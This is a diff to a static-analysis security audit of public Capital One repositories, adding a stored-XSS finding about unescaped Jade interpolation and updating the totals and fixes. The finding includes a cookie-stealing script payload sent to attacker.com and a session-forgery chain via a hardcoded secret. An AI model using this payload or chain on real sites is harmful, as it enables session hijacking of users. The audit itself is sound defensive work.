@@ -8,9 +8,9 @@
 
 This report contains the results of a static-analysis security audit of 45 public repositories in the Capital One GitHub organization. Analysis focused exclusively on high and critical vulnerabilities reachable through HTTP requests and normal application interaction.
 
-**Total confirmed vulnerabilities: 22**
+**Total confirmed vulnerabilities: 23**
 - Critical: 3
-- High: 11
+- High: 12
 - Medium-High: 8
 
 Each finding below survived multiple rounds of false-positive review, including verification that the code is not dead/test/mock, that no upstream guards neutralize the issue, and that a realistic attack path exists.
@@ -465,6 +465,30 @@ value = value
 
 ---
 
+### VULN-23: Stored XSS via Unescaped Jade `!{}` Interpolation in Multiple Templates
+- **Severity:** HIGH
+- **Repository:** CreditOffers-API-reference-app
+- **Files:**
+  - `views/index.jade:60` — `!{review.count}` (unescaped review count)
+  - `views/offers.jade:38` — `!{card.productDisplayName}` (unescaped product name)
+  - `views/includes/prefill-accept-modal.jade:34,40,46-51,58,66,72,79` — multiple `!{user.*}` fields
+  - `views/layout.jade:34` — `!{copyLine}` (unescaped marketing copy)
+- **Vulnerability Type:** Stored XSS (CWE-79)
+
+**Taint Flow:**
+1. Entry: API response data flows through `client.js` `sendRequest` with no output sanitization
+2. `review.count` and `review.link` come from `card.productMetrics[0].ratingsAndReviews` — passed through from the API via `_.pick` without sanitization in the product viewmodel
+3. `prefill-accept-modal.jade` renders all user session fields (firstName, lastName, dateOfBirth, address, phone, email, annualIncome) using `!{}` (unescaped interpolation)
+4. Session data is signed with the hardcoded secret from VULN-04, enabling session forgery with XSS payloads
+
+**Why protections fail:** Jade/Pug `!{}` is explicitly the unescaped interpolation syntax (safe alternative is `#{}`). While `productDisplayName` and `marketingCopy` are sanitized via `sanitize-html`, the `review.count`, `review.link`, and all user session fields in the prefill modal receive zero sanitization.
+
+**Exploitation (chained with VULN-04):** An attacker forges a session cookie using the hardcoded secret, setting `user.firstName` to `<script>document.location='https://attacker.com/?c='+document.cookie</script>`. When the prefill acceptance modal renders, `!{user.firstName}` outputs the payload unescaped, stealing the victim's session cookie. Alternatively, if the upstream API returns a `review.count` containing HTML, it executes in any user's browser viewing the product listing.
+
+**Not a false positive because:** Jade `!{}` is documented as unescaped output. Multiple template files use it for data that is either API-sourced (unsanitized) or session-sourced (forgeable via VULN-04).
+
+---
+
 ## DISCARDED FINDINGS (False Positives After Review)
 
 The following were investigated and determined to NOT be exploitable:
@@ -507,7 +531,7 @@ The following were investigated and determined to NOT be exploitable:
 2. **Immediate:** Fix VULN-04 (hardcoded session secret) - rotate the secret and load from environment
 3. **Immediate:** Fix VULN-06 (arbitrary file write in WP plugin) - validate ini_path against an allowlist
 4. **High priority:** Fix all locopy SQL injection issues (VULN-10 through VULN-13) - use parameterized queries for identifiers
-5. **High priority:** Fix all XSS issues (VULN-01, 02, 03, 08, 17) - use escaped output tags
+5. **High priority:** Fix all XSS issues (VULN-01, 02, 03, 08, 17, 23) - use escaped output tags (`#{}` instead of `!{}` in Jade, `<%= %>` instead of `<%-` in EJS)
 6. **High priority:** Add authentication to exposed endpoints (VULN-15, 16, 21)
 7. **Medium priority:** Fix command injection in rubicon-ml (VULN-18) - use `subprocess.run` without `shell=True`
 8. **Medium priority:** Use `yaml.safe_load()` in giraffez (VULN-19)
